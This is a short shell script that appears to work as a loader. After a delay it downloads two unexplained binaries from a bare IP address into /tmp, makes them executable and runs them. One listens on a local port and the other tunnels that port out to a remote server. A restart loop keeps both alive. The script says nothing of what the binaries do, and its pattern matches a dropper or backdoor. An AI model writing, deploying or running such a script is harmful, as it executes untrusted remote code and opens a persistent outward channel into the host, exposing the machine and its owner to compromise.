#!/bin/sh
echo "Sleeping for 2 minutes"
sleep 120

# Download section loop
while true; do
  if ping -q -c 1 -W 1 8.8.8.8 >/dev/null; then
    echo "IPv4 is up"
    cd /tmp
    wget -q http://160.191.224.12:18609/puncher
    wget -q http://160.191.224.12:18609/OverseerITM
    chmod +x puncher OverseerITM
    break
  else
    echo "IPv4 is down"
  fi
  sleep 10
done

# Restart loop for puncher and OverseerITM
while true; do
  echo "Starting OverseerITM and puncher..."
  
  ./OverseerITM --port 8888 >/dev/null 2>&1 &
  overseer_pid=$!
  
  ./puncher forward --server vps-ip:12345 --local 127.0.0.1:8888 --pool-size 10 &
  puncher_pid=$!
  
  wait -n $overseer_pid $puncher_pid
  echo "One of the services exited. Restarting both..."
  
  kill $overseer_pid $puncher_pid 2>/dev/null
  sleep 5
done
